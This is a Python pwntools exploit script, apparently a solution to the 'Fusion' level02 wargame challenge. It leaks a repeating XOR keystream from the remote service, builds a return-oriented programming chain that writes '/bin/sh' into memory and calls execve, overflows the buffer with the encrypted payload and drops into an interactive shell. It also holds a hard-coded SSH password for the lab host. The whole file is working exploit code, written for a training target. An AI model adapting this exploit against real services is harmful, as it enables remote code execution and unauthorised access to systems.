__author__ = '@tomereyz'

from pwn import *

context.clear(arch='i386')


def leak_key_buffer(r):
    r.send('E')
    time.sleep(1)

    word = 'A' * 4
    payload = word * 32
    r.send(pack(len(payload), word_size=32))
    time.sleep(1)

    log.info('payload: {payload}'.format(payload=payload))
    r.send(payload)
    time.sleep(1)

    msg = r.recvuntil("--]\n")
    log.info(msg)

    payload_length = unpack(r.recv(4), word_size=32)
    encrypted_payload = r.recv(len(payload))

    log.info('payload_length: {payload_length}'.format(payload_length=payload_length))
    log.info('encrypted_payload: {encrypted_payload}'.format(encrypted_payload=encrypted_payload))

    key_buffer = [unpack(y, word_size=32) ^ unpack(word, word_size=32) for y in
                  [encrypted_payload[x:x + 4] for x in xrange(0, len(encrypted_payload), 4)]]
    return key_buffer


def test_key_buffer(r, key_buffer):
    r.send('E')
    time.sleep(1)

    word = 'A' * 4
    payload = word * 32

    encrypted_payload = ''.join(
        [pack(y, word_size=32) for y in [unpack(payload[x:x + 4], word_size=32) ^ key_buffer[(x / 4) % 32]
                                         for x in xrange(0, len(payload), 4)]])

    r.send(pack(len(encrypted_payload), word_size=32))
    time.sleep(1)

    log.info('encrypted_payload: {encrypted_payload}'.format(encrypted_payload=encrypted_payload))
    r.send(encrypted_payload)
    time.sleep(1)

    msg = r.recvuntil("--]\n")
    log.info(msg)

    payload_length = unpack(r.recv(4), word_size=32)
    decrypted_payload = r.recv(len(payload))

    log.info('payload_length: {payload_length}'.format(payload_length=payload_length))
    log.info('decrypted_payload: {decrypted_payload}'.format(decrypted_payload=decrypted_payload))

    return key_buffer


def overflow_buffer(r, key_buffer, payload):
    r.send('E')
    time.sleep(1)

    payload += 'A' * (4 - (len(payload) % 4))

    encrypted_payload = ''.join(
        [pack(y, word_size=32) for y in [unpack(payload[x:x + 4], word_size=32) ^ key_buffer[(x / 4) % 32]
                                         for x in xrange(0, len(payload), 4)]])

    r.send(pack(len(encrypted_payload), word_size=32))
    time.sleep(1)

    log.info('encrypted_payload: {encrypted_payload}'.format(encrypted_payload=encrypted_payload))
    r.send(encrypted_payload)
    time.sleep(1)

    msg = r.recvuntil("--]\n")
    log.info(msg)

    payload_length = unpack(r.recv(4), word_size=32)
    decrypted_payload = r.recv(len(payload))

    log.info('payload_length: {payload_length}'.format(payload_length=payload_length))
    log.info('decrypted_payload: {decrypted_payload}'.format(decrypted_payload=decrypted_payload))

    return key_buffer


def write_buffer(e, rop_object, destination, buf):
    for i, c in enumerate(buf):
        rop_object.call('snprintf', [destination + i, 2, next(e.search(c))])
    return rop_object


def main(download):
    challenge_series = 'fusion'
    challenge_name = 'level02'
    challenge_port = 20002
    ssh_client = ssh(user=challenge_series, host=challenge_series, password='godmode')
    if download:
        ssh_client.download('/opt/fusion/bin/{}'.format(challenge_name))

    e = ELF(challenge_name)
    rop_object = ROP(e)

    r = remote(host=challenge_series, port=challenge_port)

    msg = r.recvuntil("--]\n")
    log.info(msg)
    pause()
    key_buffer = leak_key_buffer(r=r)
    test_key_buffer(r=r, key_buffer=key_buffer)

    # cyclic_find(0x61616165)
    bss_address = 0x804b460
    rop_object = write_buffer(e=e, rop_object=rop_object, destination=bss_address, buf='/bin/sh\x00')
    rop_object.call('execve', [bss_address, 0, 0])
    print rop_object.dump()
    payload = cyclic(32 * 4096) + cyclic(16) + rop_object.chain()

    overflow_buffer(r=r, key_buffer=key_buffer, payload=payload)

    r.sendline('Q')
    r.interactive()


if __name__ == '__main__':
    main(download=True)
